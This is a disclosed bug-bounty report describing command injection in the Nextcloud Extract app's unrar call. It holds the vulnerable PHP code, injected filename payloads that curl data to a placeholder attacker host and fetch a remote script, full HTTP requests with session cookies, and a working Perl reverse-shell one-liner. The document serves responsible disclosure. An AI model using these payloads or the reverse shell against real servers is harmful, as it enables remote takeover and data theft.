# Remote Code Execution via Extract App Plugin

## Report Details
- **Report ID**: 546753
- **URL**: https://hackerone.com/reports/546753
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-04-23T09:09:35.695Z
- **Disclosed**: 2019-05-30T07:17:04.686Z

## Reporter
- **Username**: hdbreaker
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Hi, I found a critical issue in the Add-on "Extract" listed in the Nextcloud Marketplace: https://apps.nextcloud.com/apps/extract (This extension can be installed directly from Nextcloud Application)

The vulnerability was found in file: extract/lib/Controller/ExtractionController.php line 102.

The affected code can be seen below:

```
if (extension_loaded ("rar")){
				$rar_file = rar_open($file);
				$list = rar_list($rar_file);
				var_dump($rar_file);
				foreach($list as $fileOpen) {
					$entry = rar_entry_get($rar_file, $fileOpen->getName());
					$entry->extract($dir); // extract to the current dir
					self::scanFolder('/'.$this->UserId.'/files'.$directory.'/'.$fileOpen->getName());
				}
				rar_close($rar_file); 
			}else{
                ######## BUG HERE #########
				exec("unrar x \"".$file."\" -R \"".$dir."\" -o+",$output,$return);
                #########################
				foreach ($output as $val ) {
					if(preg_split('/ /', $val, -1, PREG_SPLIT_NO_EMPTY)[0] == "Extracting" && 
					preg_split('/ /', $val, -1, PREG_SPLIT_NO_EMPTY)[1] != "from"){
						$fichier = substr(strrchr($PATH, "/"), 1);
						self::scanFolder('/'.$this->UserId.'/files'.$directory.'/'.$fichier);
					}
				}
			}
```

The unrar line allows Command Injection via $file and $dir parameters, an attacker could use the following payload in order to exploit a Remote Command Execution in a Nextcloud Server and exfiltrate data via Curl requests.

```
nameOfFile=sample.rar"|curl www.attacker.com:443/data?id=$(id | base64)|"&directory=&external=0
```

Abusing this issue I was able to take full control of the demo instance: https://demo.nextcloud.com/lun0shai/

The steps to reproduce this PoC can be seen below:

1) Create a demo instance in https://demo.nextcloud.com and login.
2) Install the plugin Extract directly from the Apps menu:

{F474350}

3) Once the Add-on is installed, the attacker needs to upload a sample.rar file:

{F474351}

4) Then, the attacker needs to use the functionality "Extract Here" from the context menu and intercept the HTTP Request with BurpSuite:

{F474352}

Burp Interceptor:
{F474356}

5) At this point, the attacker can manipulate the $nameOfFile and & $dir parameters to achieve Remote Code Execution in the Nextcloud Instance. This PoC of RCE was performed over a Demo Instance running the latest version of NextClou.

To achieve RCE over Demo Instance 2 payloads were needed:

a) The attacker needs to force the application to download a Perl Reverse Shell to /tmp folder using curl, this was achieved using the following HTTP Request:

Note: 
My server IP is: 138.68.1.244

HTTP Request:
```
POST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1
Host: demo.nextcloud.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: v+/28PW5/gilVA9we7iR7yrAYLjQCiYpfyx4e+jIdPU=:24ODl5qN0WLLN14xF+vgrEC0EM/ifB55OxU1SIe+LcE=
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 98
Connection: close
Cookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lbdC6UlHe0FkyVXeu5e2gA%2FOloJaUrRkXAb8sDLgF2pQYpUh1NlHeS8rpppQZakBiTH3K9%2FwWAytej%2FCTkV9%2FurYyRaMVQWLbAyu; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=eGciTpRb4Bu7DpG2ohUjUWhAd%2BjQGRbb; nc_session_id=aashsh75p508m9qk0tdq0ahk8v

nameOfFile=sample.rar"|curl http://138.68.1.244/shell.pl -o /tmp/shell2.pl|"&directory=&external=0
```

HTTP Response:
```
HTTP/1.1 200 OK
Date: Tue, 23 Apr 2019 08:24:50 GMT
Server: Apache
Strict-Transport-Security: max-age=15768000
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';script-src 'nonce-bXBVNko3dWtWZnFVMzl3QnpTMHBlSkwvYlhhSWtLczZXelhlTFRkMGNJdz06L3ZsUFFOU1FlcEQ2dkkxQW9YNVlPL2lMSFFHNjVwTnFId3lUSGxnQ0tiZz0=';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self' data:;connect-src 'self' stun.nextcloud.com:443;media-src 'self';frame-src https://demo.nextcloud.com
X-Frame-Options: SAMEORIGIN
Content-Length: 4
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Robots-Tag: none
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: no-referrer
Content-Type: application/json; charset=utf-8
Connection: close

null
```

The above request wrote the following reverse shell in /tmp/shell.pl
```
use Socket;$i="138.68.1.244";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}
```

(At this point a Netcat Listener was running on my Server)
{F474360}

b) A second HTTP Request was needed to execute the Perl Reverse Shell and gain full shell access over the remote server (demo.nextcloud.com):

HTTP Request:
```
POST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1
Host: demo.nextcloud.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: v+/28PW5/gilVA9we7iR7yrAYLjQCiYpfyx4e+jIdPU=:24ODl5qN0WLLN14xF+vgrEC0EM/ifB55OxU1SIe+LcE=
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 66
Connection: close
Cookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lbdC6UlHe0FkyVXeu5e2gA%2FOloJaUrRkXAb8sDLgF2pQYpUh1NlHeS8rpppQZakBiTH3K9%2FwWAytej%2FCTkV9%2FurYyRaMVQWLbAyu; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=eGciTpRb4Bu7DpG2ohUjUWhAd%2BjQGRbb; nc_session_id=aashsh75p508m9qk0tdq0ahk8v

nameOfFile=sample.rar"|perl /tmp/shell2.pl|"&directory=&external=0
```

After these steps, my Server (IP: 138.68.1.244) received the Reverse Shell successfully and I was able to move freely over the Docker Instance of Nextcloud, reading even the config file as can be seen below:

An inbound connection from demo.nextcloud.com was received
{F474361}

Content of /config/config.php
{F474362}

Hope this could help to improve your security and check continuously the Applications that you spread using your market.

Please do not hesitate to contact me if you need any help to detect/resolve this issue.

Regards,

## Impact

An authenticated user could use the Extract Plugin listed in the Apps Market of Nextcloud to achieve Remote Code Execution in any Nextcloud instance.

## Attachments
- Screen_Shot_2019-04-23_at_5.41.35_AM.png
- Screen_Shot_2019-04-23_at_5.43.18_AM.png
- Screen_Shot_2019-04-23_at_5.43.39_AM.png
- Screen_Shot_2019-04-23_at_5.47.40_AM.png
- Screen_Shot_2019-04-23_at_5.51.48_AM.png
- Screen_Shot_2019-04-23_at_5.54.31_AM.png
- Screen_Shot_2019-04-23_at_5.55.31_AM.png
